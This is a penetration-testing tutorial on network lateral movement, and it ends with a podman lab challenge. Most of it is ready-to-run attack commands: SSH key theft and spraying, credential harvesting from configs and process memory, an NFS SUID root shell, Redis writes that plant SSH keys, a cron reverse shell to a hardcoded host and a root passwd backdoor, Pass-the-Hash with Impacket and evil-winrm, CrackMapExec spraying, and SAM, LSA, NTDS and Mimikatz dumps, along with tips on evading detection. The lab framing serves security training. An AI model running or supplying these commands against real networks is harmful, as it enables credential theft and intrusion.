Lateral Movement

Moving from an initial foothold to other hosts, covering credential harvesting, remote execution, and Pass-the-Hash.

Overview

Lateral movement turns a single compromised host into access to the rest of the network. It is a loop: harvest credentials from the host you own, test them against other hosts, find the next target, and execute code there. This article covers the SSH , NFS, and Redis paths common on Linux, the SMB and WMI paths common on Windows, and the credential-reuse tooling that automates both.

The Lateral Movement Model

Lateral movement is the progression from an initial foothold to broader access within a target network. The initial compromise gives you one box. The internal network contains dozens or thousands more. Each lateral hop increases your attack surface, reveals new data, and gets you closer to the objective (domain admin, sensitive data, critical infrastructure).

Lateral movement operates on a vicious cycle:

┌────────────────────┐
│ 1. Gain foothold    │
│    on Host A        │
└────────+───────────┘
         ▼
┌────────────────────┐       ┌──────────────────────┐
│ 2. Harvest creds   │──────►│ 4. Find next target  │
│    from Host A     │       │    (scan, ARP, DNS)  │
└────────+───────────┘       └───────────+──────────┘
         │                               │
         ▼                               ▼
┌────────────────────┐       ┌──────────────────────┐
│ 3. Try creds on    │◄──────│ 5. Execute remote    │
│    other hosts     │       │    command on Host B  │
└────────+───────────┘       └───────────+──────────┘
         │                               │
         └──── GOTO 2 on Host B ────────◄┘

Every credential found is a potential key to another door. Every code execution method is a way to turn that key. The attacker who can harvest creds fastest and spray them widest wins.

Linux Lateral Movement

Linux environments typically lack centralized authentication (no Domain Controller equivalent in most setups). Lateral movement relies on SSH keys, password reuse, and shared filesystems.

SSH Key Discovery and Hijacking

# Upon gaining a foothold, FIRST thing - find all SSH material:
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null

# Check the current user's SSH directory:
ls -la ~/.ssh/
# id_rsa          - private key (the target)
# id_rsa.pub      - public key (useful for authorized_keys of other hosts)
# known_hosts     - list of hosts this user previously connected to
# config          - host aliases, usernames, jump hosts
# authorized_keys - who can SSH into THIS host (identify other users/admins)

# Check SSH agent socket - hijack the agent to authenticate elsewhere:
echo $SSH_AUTH_SOCK
# /tmp/ssh-XXXXXX/agent.1234

# List keys loaded in the agent:
ssh-add -l

# Use the agent to connect to hosts listed in known_hosts:
SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.1234 ssh user@hostname

# Extract private keys from agent memory (root required):
# The agent holds decrypted keys in memory
cat /proc/$(pgrep -u $USER ssh-agent)/maps | grep -i key

Known Hosts Reconnaissance

# known_hosts reveals the network topology - every host this user has ever SSH'd to
cat ~/.ssh/known_hosts | cut -d' ' -f1 | sort -u

# Strip hashed entries (HashKnownHosts enabled):
# Hashed format: |1|base64_salt|base64_hashed_hostname
# If not hashed, you get plaintext hostnames and IPs
grep -v '^|' ~/.ssh/known_hosts | cut -d' ' -f1

# ~/.ssh/config often contains host aliases and jump patterns:
cat ~/.ssh/config
# Host prod-db
#     HostName 10.0.50.12
#     User dbadmin
#     IdentityFile ~/.ssh/db_key
#     ProxyJump bastion.corp.com
# -> This single entry tells you: target IP, username, key file location, jumphost

Automated SSH Key Spraying

# Harvest all private keys discovered on the compromised host:
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null > /tmp/keys_found.txt

# Extract target hosts from known_hosts and bash_history:
grep -oP '(?<=@)[a-zA-Z0-9.-]+' ~/.bash_history | sort -u > /tmp/known_targets.txt
grep -oP '(?<=ssh ).*?(?=\s|$)' ~/.bash_history | grep -oP '[^@\s]+$' | sort -u >> /tmp/known_targets.txt
grep -v '^|' ~/.ssh/known_hosts | cut -d' ' -f1 | sort -u >> /tmp/known_targets.txt

# Spray each key against each host:
while read keyfile; do
    chmod 600 "$keyfile" 2>/dev/null
    while read target; do
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
            -o BatchMode=yes -i "$keyfile" root@"$target" 'hostname; id' 2>/dev/null
        # Try common usernames:
        for user in root admin ubuntu centos ec2-user; do
            ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
                -o BatchMode=yes -i "$keyfile" "$user@$target" 'hostname; id' 2>/dev/null
        done
    done < /tmp/known_targets.txt
done < /tmp/keys_found.txt

SSH Agent Forwarding Hijack

SSH agent forwarding ( ssh -A ) is a common convenience feature where the local SSH agent socket is forwarded to the remote host. If you compromise a host with active agent forwarding, you inherit the user's loaded keys: 

# Find forwarded agent sockets - they appear as temporary files:
find /tmp -name "agent.*" -user $(whoami) 2>/dev/null
ls -la /tmp/ssh-*/agent.*

# If root, find ALL agent sockets on the system:
find /tmp -type s -name "agent.*" 2>/dev/null
find /run/user -type s -name "agent.*" 2>/dev/null

# Use a discovered agent socket:
SSH_AUTH_SOCK=/tmp/ssh-jk8Xqz9q/agent.12345 ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-jk8Xqz9q/agent.12345 ssh user@target.internal

# Hunt for SSH processes with agent forwarding:
pgrep -a ssh | grep -- '-A'
# The -A flag means agent forwarding is active for that session

Credential Harvesting in Config Files

# Database credentials in web app configs:
grep -rn "password" /var/www/ --include="*.php" --include="*.py" --include="*.env" 2>/dev/null
grep -rn "DB_PASS\|DATABASE_URL\|MYSQL_PWD" /var/www/ --include="*.env" 2>/dev/null

# Application credentials:
grep -rn "password\|passwd\|secret\|token" /etc/ --include="*.conf" --include="*.ini" --include="*.yaml" 2>/dev/null

# Environment variables of running processes:
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
    strings /proc/$pid/environ 2>/dev/null | grep -iE 'pass|secret|token|key'
done

# Container secrets:
find /run/secrets -type f -exec cat {} \; 2>/dev/null

# Git repositories with hardcoded credentials:
find / -name ".git-credentials" 2>/dev/null
find / -name ".gitconfig" -exec grep -H url {} \; 2>/dev/null

# Kubernetes secrets (if on a K8s node):
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
ls /run/secrets/kubernetes.io/ 2>/dev/null

# Bash history - goldmine for credentials:
cat ~/.bash_history | grep -iE 'pass|secret|token|mysql.*-p|psql|ssh.*@'
cat ~/.zsh_history | grep -iE 'pass|secret|token'

NFS Lateral Movement

If /home or /opt is mounted via NFS with no_root_squash , any root user on an NFS client can create SUID binaries that run as root on every other NFS client. 

# Check NFS mounts:
mount | grep nfs
df -hT | grep nfs

# Check /etc/exports on the NFS server (if you can read it):
cat /etc/exports
# Look for lines WITHOUT "root_squash" (or with "no_root_squash")

# Create a SUID root shell on the NFS share:
cp /bin/bash /mnt/nfs_share/.rootshell
chmod 4755 /mnt/nfs_share/.rootshell

# On any other NFS client that mounts the same share:
/mnt/nfs_share/.rootshell -p
# -p: preserve effective UID (SUID bit)
# You now have a root shell on that host

# C shared library injection via NFS:
cat > /mnt/nfs_share/lib_inject.c << 'CEOF'
#include <stdlib.h>
__attribute__((constructor)) void injected_lib(void) {
    setuid(0); setgid(0);
    system("/bin/bash -c 'cp /bin/bash /tmp/rootshell && chmod 4755 /tmp/rootshell'");
}
CEOF
gcc -shared -fPIC /mnt/nfs_share/lib_inject.c -o /mnt/nfs_share/lib_inject.so
# Set LD_PRELOAD=/mnt/nfs_share/lib_inject.so on any NFS client that runs a binary

Redis Lateral Movement

Redis instances often run without authentication on internal networks. Unauthenticated Redis access = arbitrary file write. 

# Scan internal network for Redis (port 6379):
nmap -p 6379 --open 10.0.0.0/24 192.168.0.0/24

# Connect to unauthenticated Redis:
redis-cli -h 10.0.50.10

# Write SSH authorized_keys (if Redis runs as a user with SSH configured):
redis-cli -h 10.0.50.10 << 'EOF'
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET mykey "\n\nssh-ed25519 AAAAC3...YOUR_PUB_KEY_HERE\n\n"
SAVE
EOF

# Write a cron job for reverse shell:
redis-cli -h 10.0.50.10 << 'EOF'
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SET mykey "\n\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.100/4444 0>&1'\n\n"
SAVE
EOF

# Write /etc/passwd entry (rare but possible):
redis-cli -h 10.0.50.10 << 'EOF'
CONFIG SET dir /etc
CONFIG SET dbfilename passwd
SET mykey "\n\nbackdoor:x:0:0:root:/root:/bin/bash\n\n"
SAVE
EOF
# su backdoor   # if passwordless su is configured

Configuration Management Abuse

If the host is managed by Ansible, Puppet, Chef, or Salt, the CM server holds keys to every managed node. 

# Ansible:
find /etc/ansible -type f 2>/dev/null
cat /etc/ansible/hosts 2>/dev/null          # Inventory of all managed hosts
cat /etc/ansible/ansible.cfg 2>/dev/null    # SSH key paths, privilege escalation
find /home -name "ansible.cfg" 2>/dev/null

# Puppet:
find /etc/puppetlabs -type f 2>/dev/null
cat /etc/puppetlabs/puppet/ssl/certs/*.pem 2>/dev/null

# Chef:
find /etc/chef -type f 2>/dev/null
cat /etc/chef/client.pem 2>/dev/null   # Client key - can impersonate this node

Windows Lateral Movement

Windows Active Directory environments centralize authentication, which means one set of credentials (or one NTLM hash) opens many doors. Each execution technique uses a different Windows subsystem, giving you alternatives when one is blocked or monitored.

Lateral Movement Protocol Map

Technique Tool Port(s) Auth Required Protocol Detection Level
PSExec Impacket psexec.py 445 (SMB) Admin credentials SMB + Service Control High (service creation event)
WMIExec Impacket wmiexec.py 135 + dynamic (49152-65535) Admin credentials DCOM/WMI Medium (WMI event)
SMBExec Impacket smbexec.py 445 (SMB) Admin credentials SMB + Service Control Medium (different pattern)
AtExec Impacket atexec.py 445 (SMB) Admin credentials SMB + Task Scheduler High (scheduled task event)
DCOMExec Impacket dcomexec.py 135 + dynamic Admin credentials DCOM (MMC20.Application) Low (fewer artifacts)
WinRM evil-winrm 5985 Admin credentials WinRM/WS-Man Medium (WinRM log)
RDP xfreerdp 3389 User credentials RDP Medium (RDP log)
SSH ssh 22 SSH keys/password SSH Low

The Impacket Suite

Impacket is the definitive toolset for Windows lateral movement from Linux. Install:

# ArchLinux:
pacman -S impacket   # AUR: python-impacket

# OR pip:
pip install impacket

# Verify:
psexec.py --help
wmiexec.py --help
crackmapexec --help

PSExec - Service-Based Execution

PSExec creates a service on the target to execute commands. It uploads a service binary to ADMIN$ shares, creates a Windows service, starts it, and deletes the service. This leaves clear forensic evidence (Event ID 7045 - service creation). 

# Interactive shell:
psexec.py corp.local/administrator:'Password123'@10.0.0.50

# Execute single command:
psexec.py corp.local/administrator:'Password123'@10.0.0.50 'whoami; hostname'

# Pass-the-Hash (NTLM hash instead of password):
psexec.py -hashes ':aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae51' \
    corp.local/administrator@10.0.0.50

# Targeted service name (evasion - use a legitimate-sounding name):
psexec.py -service-name 'WSearchIdxPi' corp.local/administrator:'Password123'@10.0.0.50

# Specify remote share (default: ADMIN$):
psexec.py -share 'C$' corp.local/administrator:'Password123'@10.0.0.50

WMIExec - DCOM/WMI Execution

WMI Exec uses the Windows Management Instrumentation interface via DC OM (Distributed Component Object Model). It creates a semi-interactive shell by spawning cmd.exe through a WMI process creation call. Fewer forensic artifacts than PSExec (no service created). 

# Interactive shell:
wmiexec.py corp.local/administrator:'Password123'@10.0.0.50

# Pass-the-Hash:
wmiexec.py -hashes ':aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae51' \
    corp.local/administrator@10.0.0.50

# Execute single command:
wmiexec.py corp.local/administrator:'Password123'@10.0.0.50 'whoami'

# Specify a different command (default: cmd.exe):
wmiexec.py -command 'powershell.exe' corp.local/administrator:'Password123'@10.0.0.50

SMBExec - SMB Native Execution

SMB Exec leverages the SMB protocol's ability to create services but uses a different execution pattern than PSExec. Instead of uploading a binary, it writes to a named pipe and uses %COMSPEC% for execution. 

# Interactive shell via SMBExec:
smbexec.py corp.local/administrator:'Password123'@10.0.0.50

# Pass-the-Hash:
smbexec.py -hashes ':LMHASH:NTHASH' corp.local/administrator@10.0.0.50

# Specify custom command:
smbexec.py -cmd 'powershell.exe' corp.local/administrator:'Password123'@10.0.0.50

AtExec - Scheduled Task Execution

AtExec creates a scheduled task on the remote host via the ATSVC named pipe. The task executes once immediately then deletes itself. 

# Execute command via scheduled task:
atexec.py corp.local/administrator:'Password123'@10.0.0.50 'whoami'

# Pass-the-Hash:
atexec.py -hashes ':NTHASH' corp.local/administrator@10.0.0.50 'net user backdoor Password123 /add'

DCOMExec - COM Object Execution

DC OMExec uses DC OM objects such as MMC20.Application , ShellWindows , or ShellBrowserWindow . Each COM object offers a different execution method. 

# Interactive shell using MMC20.Application COM object:
dcomexec.py corp.local/administrator:'Password123'@10.0.0.50

# Use ShellWindows COM object:
dcomexec.py -object ShellWindows corp.local/administrator:'Password123'@10.0.0.50

# Use ShellBrowserWindow:
dcomexec.py -object ShellBrowserWindow corp.local/administrator:'Password123'@10.0.0.50

# Pass-the-Hash:
dcomexec.py -hashes ':NTHASH' corp.local/administrator@10.0.0.50

DC OMExec has the lowest detection footprint because it uses legitimate COM object interactions rather than service creation or binary uploads.

WinRM with evil-winrm

WinRM (Windows Remote Management) provides a PowerShell-based remote session over HTTP / HTTPS . 

# Install evil-winrm:
gem install evil-winrm
# ArchLinux AUR: evil-winrm

# Connect:
evil-winrm -i 10.0.0.50 -u administrator -p 'Password123'

# With domain:
evil-winrm -i 10.0.0.50 -u administrator -p 'Password123' -d corp.local

# Pass-the-Hash:
evil-winrm -i 10.0.0.50 -u administrator -H '5fbc3d5fec8206a30f4b6c473d68ae51'

# SSL (port 5986):
evil-winrm -i 10.0.0.50 -S -u administrator -p 'Password123'

# Upload/download files during session:
evil-winrm -i 10.0.0.50 -u administrator -p 'Password123' \
    -s /path/to/scripts/   # Local scripts directory
    -e /path/to/exes/       # Local executables directory

Inside an evil-winrm session:

# Upload: evil-winrm handles -s and -e directories
# Just call the script name:
MyScript.ps1

# Download a file from the target:
download C:\Windows\System32\config\SAM sam_copy
download C:\Windows\System32\config\SYSTEM system_copy

# Upload a local file to target:
upload /local/path/to/mimikatz.exe C:\Windows\Temp\m.exe

RDP with xfreerdp

# Basic RDP connection:
xfreerdp /v:10.0.0.50 /u:administrator /p:'Password123'

# Pass-the-Hash - Restricted Admin Mode (requires Windows 8.1/2012 R2+):
xfreerdp /v:10.0.0.50 /u:administrator /pth:5fbc3d5fec8206a30f4b6c473d68ae51

# Drive redirection (mount local directory on target):
xfreerdp /v:10.0.0.50 /u:administrator /p:'Password123' \
    /drive:share,/home/user/tools

# Network-level authentication (NLA):
xfreerdp /v:10.0.0.50 /u:administrator /p:'Password123' /sec:nla

# TLS security (if NLA unavailable):
xfreerdp /v:10.0.0.50 /u:administrator /p:'Password123' /sec:tls

CrackMapExec - The Swiss Army Knife

CrackMapExec (CME) combines credential spraying, remote execution, and credential dumping across entire subnets in a single tool. The original project is no longer maintained; NetExec is its actively maintained successor and keeps the same command syntax under the nxc binary, with crackmapexec and cme kept as aliases. 

# Install (maintained fork):
pip install netexec
# ArchLinux AUR: netexec

Credential Spraying

# Password spray - single password against all user accounts:
crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Summer2026!' --continue-on-success

# Hash spray - NTLM hash across the network:
crackmapexec smb 10.0.0.0/24 -u administrator \
    -H '5fbc3d5fec8206a30f4b6c473d68ae51'

# Brute force against a single host:
crackmapexec smb 10.0.0.50 -u users.txt -p passwords.txt

# Check which hosts you have local admin on:
crackmapexec smb 10.0.0.0/24 -u administrator -p 'Password123'
# Look for "(Pwn3d!)" in the output - this means local admin access

Execution

# Execute command on hosts where you have admin access:
crackmapexec smb 10.0.0.0/24 -u administrator -p 'Password123' \
    -x 'whoami; hostname; ipconfig'

# PowerShell execution:
crackmapexec smb 10.0.0.0/24 -u administrator -p 'Password123' \
    -X 'Get-Process | Select-Object Name, Id | Format-Table -AutoSize'

# Execute a local command file:
crackmapexec smb 10.0.0.0/24 -u administrator -p 'Password123' \
    --exec-method smbexec -x 'whoami'
# --exec-method: smbexec (default for -x), wmiexec, atexec

Credential Dumping

# Dump SAM hashes from all Pwn3d hosts:
crackmapexec smb 10.0.0.0/24 -u administrator -p 'Password123' --sam

# Dump LSA secrets:
crackmapexec smb 10.0.0.0/24 -u administrator -p 'Password123' --lsa

# Dump NTDS.dit (domain controller - Domain Admin required):
crackmapexec smb 10.0.0.10 -u administrator -p 'Password123' --ntds

# Run Mimikatz module (if Mimikatz is available):
crackmapexec smb 10.0.0.0/24 -u administrator -p 'Password123' -M mimikatz

# Enumeration modules:
crackmapexec smb 10.0.0.0/24 -u administrator -p 'Password123' -M enumerated
crackmapexec smb 10.0.0.0/24 -u administrator -p 'Password123' -M empire_exec

CME with Different Protocols

# SMB:
crackmapexec smb 10.0.0.0/24 -u user -p pass

# WinRM:
crackmapexec winrm 10.0.0.0/24 -u user -p pass

# MSSQL:
crackmapexec mssql 10.0.0.0/24 -u sa -p pass

# SSH:
crackmapexec ssh 10.0.0.0/24 -u root -p pass

# FTP:
crackmapexec ftp 10.0.0.0/24 -u anonymous -p ''

# RDP (check if credentials work):
crackmapexec rdp 10.0.0.0/24 -u user -p pass

# LDAP (enumerate domain):
crackmapexec ldap 10.0.0.10 -u user -p pass --users

CME Output Format

SMB    10.0.0.50    445    SRV-DC01    [*] Windows Server 2019 Standard 17763 (name:SRV-DC01) (domain:corp.local) (signing:True) (SMBv1:False)
SMB    10.0.0.50    445    SRV-DC01    [+] corp.local\administrator:Password123 (Pwn3d!)
SMB    10.0.0.51    445    SRV-WEB01   [-] corp.local\administrator:Password123
SMB    10.0.0.52    445    SRV-SQL01   [+] corp.local\administrator:Password123 (Pwn3d!)

The output tells you: - [*] : Information - OS version, hostname, domain, SMB signing status - [+] : Successful authentication (credential combo works) - (Pwn3d!) : The authenticated user has local administrator privileges - [-] : Authentication failed

Critical intelligence from CME output: - SMB signing status: signing:False means you can relay NTLM authentication ( NTLM relay attacks).

  • (Pwn3d!) hosts become your lateral movement launchpads.

Credential Harvesting

Linux Credential Harvesting

# Dump /etc/shadow for offline cracking:
cat /etc/shadow | grep -v ':\*\|:!\|:!!'
# Crack with hashcat:
hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt

# Extract passwords from process memory:
for pid in $(ls -d /proc/*/ 2>/dev/null | grep -oP '\d+'); do
    strings /proc/$pid/environ 2>/dev/null | grep -iE 'passwd|secret|key|token'
done

# Memory dump searching (root):
grep -ra "password=" /proc/*/environ 2>/dev/null

# Cached sudo credentials:
# tty_tickets stored in /var/run/sudo/ts/
ls -la /var/run/sudo/ts/$(whoami) 2>/dev/null
# These files timestamp when the user last sudo'd - indicates active users

Windows Credential Harvesting (via CME)

# SAM dump - local account hashes:
crackmapexec smb TARGET -u admin -p pass --sam
# Output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:5FBC3...
#                      ^UID     ^LM hash (disabled/blanked)     ^NTLM hash

# LSA dump - cached service account passwords, DPAPI keys:
crackmapexec smb TARGET -u admin -p pass --lsa

# NTDS.dit dump - ALL domain user hashes (requires Domain Admin):
crackmapexec smb DC_IP -u DA_user -p DA_pass --ntds vss
# This creates a Volume Shadow Copy, extracts NTDS.dit and SYSTEM hive

# Dump LSASS from a live host (Mimikatz via CME):
crackmapexec smb TARGET -u admin -p pass -M mimikatz

Pass-the-Hash Fundamentals

Windows NTLM authentication does not require the plaintext password. The NTLM hash is mathematically equivalent for authentication purposes. If you dump the SAM and obtain NTLM hashes, you can authenticate without ever cracking the password. 

# NTLM hash format: LM:NT
#   aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae51
#   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#   LM hash (ignore - blank since Vista)  NTLM hash (the one you need)

# Using with Impacket tools:
psexec.py -hashes ':5fbc3d5fec8206a30f4b6c473d68ae51' corp/administrator@10.0.0.50
wmiexec.py -hashes ':5fbc3d5fec8206a30f4b6c473d68ae51' corp/administrator@10.0.0.50
smbexec.py -hashes ':5fbc3d5fec8206a30f4b6c473d68ae51' corp/administrator@10.0.0.50

# With CrackMapExec:
crackmapexec smb 10.0.0.0/24 -u administrator \
    -H '5fbc3d5fec8206a30f4b6c473d68ae51'

# With xfreerdp (Restricted Admin Mode):
xfreerdp /v:10.0.0.50 /u:administrator /pth:5fbc3d5fec8206a30f4b6c473d68ae51

Complete Lateral Movement Workflow

This is a practical walkthrough from initial foothold to domain admin using CrackMapExec and Impacket: 

# ── Phase 1: Network Discovery ──
# On the compromised Linux host, find the local subnet:
ip addr show
ip route show | grep -E '10\.|172\.|192\.168\.'
arp -a | awk '{print $2}' | tr -d '()' | sort -u

# Scan the discovered subnet for Windows hosts:
nmap -sn 10.0.50.0/24 -oG /tmp/hosts.gnmap
grep "Up" /tmp/hosts.gnmap | awk '{print $2}' > /tmp/live_hosts.txt

# ── Phase 2: Credential Spraying ──
# With a known password from the initial compromise:
crackmapexec smb /tmp/live_hosts.txt -u users.txt -p 'KnownPassword1' --continue-on-success

# Identify which hosts accept the credentials:
crackmapexec smb /tmp/live_hosts.txt -u administrator -p 'KnownPassword1'

# ── Phase 3: Enumeration ──
# For each host where you have access, dump SAM:
crackmapexec smb /tmp/live_hosts.txt -u administrator -p 'KnownPassword1' --sam \
    | tee /tmp/sam_dumps.txt

# Extract unique NTLM hashes:
grep -oP '[0-9a-f]{32}' /tmp/sam_dumps.txt | sort -u > /tmp/ntlm_hashes.txt

# ── Phase 4: Lather, Rinse, Repeat ──
# Try each discovered hash against all remaining hosts:
while read hash; do
    crackmapexec smb /tmp/live_hosts.txt -u administrator -H "$hash" \
        --continue-on-success | grep '(Pwn3d!)'
done < /tmp/ntlm_hashes.txt

# ── Phase 5: Gain Shell Access ──
# Use the best execution method for the target environment:
# Prefer wmiexec (lower detection), fall back to psexec if WMI blocked
wmiexec.py -hashes ":$(head -1 /tmp/ntlm_hashes.txt)" \
    corp.local/administrator@10.0.50.51

# ── Phase 6: Locate Domain Controller ──
crackmapexec smb /tmp/live_hosts.txt -u administrator -p 'KnownPassword1' \
    | grep -i 'domain\|dc\|controller'
# OR check DNS:
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local

# ── Phase 7: Escalate to Domain Admin ──
# If you have local admin on a server that a DA has recently logged into:
crackmapexec smb TARGET -u administrator -p pass -M mimikatz
# Look for Domain Admin credentials in LSASS dump

# Or dump NTDS.dit if you get DA credentials:
crackmapexec smb DC_IP -u DA_user -p DA_pass --ntds vss

Challenge

Exploit the web application on web-server and escalate to root on db-server . The lab is a multi-stage Containerfile with web-server , file-server , and db-server targets on two podman networks. A lightweight container-based Linux lateral movement lab can be constructed with podman: 

Network: lateral-net (10.89.50.0/24)

┌─────────────────┐    ┌──────────────────┐    ┌──────────────────┐
│ web-server      │    │ file-server       │    │ db-server        │
│ (compromised)   │    │ (target 1)        │    │ (target 2)       │
│ IP: 10.89.50.10 │    │ IP: 10.89.50.20   │    │ IP: 10.89.50.30  │
│                 │    │                   │    │                   │
│ - nginx         │    │ - NFS share w/    │    │ - PostgreSQL      │
│ - PHP app with  │    │   no_root_squash  │    │ - Creds in config │
│   RCE vuln      │    │ - SSH key for all │    │ - Redis (no auth) │
│ - ~/.ssh/config │    │   servers in ~/.ssh│   │                   │
└─────────────────┘    └──────────────────┘    └──────────────────┘

Scenario

You have exploited an RCE in the web app on web-server (10.89.50.10). Your objective is to gain root on db-server (10.89.50.30). The intended path:

  1. On web-server , enumerate SSH material: cat ~/.ssh/config reveals file-server alias and key path.
  2. Use the discovered key to SSH into file-server .
  3. On file-server , notice /home is NFS mounted with no_root_squash . Create a SUID bash.
  4. The NFS share is also mounted on db-server . Execute the SUID bash there to get root.
  5. Alternatively: discover database credentials in /etc/db-server/config.env on web-server , directly connect to Postgre SQL on db-server .

lateral-movement.Containerfile

# Create the two networks
podman network create attacker-net --subnet 10.89.0.0/24
podman network create lateral-net --subnet 10.89.50.0/24

# Build the three stages
podman build -t lateral-web  --target web-server  -f lateral-movement.Containerfile .
podman build -t lateral-file --target file-server -f lateral-movement.Containerfile .
podman build -t lateral-db   --target db-server   -f lateral-movement.Containerfile .

# Run the hosts (web-server is dual-homed)
podman run -d --name web-server  --network attacker-net --network lateral-net --cap-add NET_ADMIN lateral-web
podman run -d --name file-server --network lateral-net --cap-add SYS_ADMIN lateral-file
podman run -d --name db-server   --network lateral-net lateral-db
